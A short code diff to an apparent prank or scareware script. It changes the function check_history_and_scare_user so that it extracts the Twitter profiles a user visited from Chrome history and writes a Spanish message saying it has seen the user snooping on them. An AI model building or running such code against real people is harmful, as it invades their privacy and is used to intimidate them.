@@ -40,9 +40,14 @@ def get_chrome_history():
 
 def check_history_and_scare_user(hacker_file, chrome_history):
     maxhist = 1
-    for item in chrome_history:
-        re.findall("https://twitter.com/[A-Za-z0-9]+$", item[2])
+    profiles_visited = []
+    url_exceptions = ["home", "notifications", "explore", "login"]
 
+    for item in chrome_history:
+        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
+        if results and results[0] not in url_exceptions:
+            profiles_visited.append(results[0])
+    hacker_file.write("He visto que has estado husmeando en los perfiles de {}...".format(", ".join(profiles_visited)))
 
 
 def main():
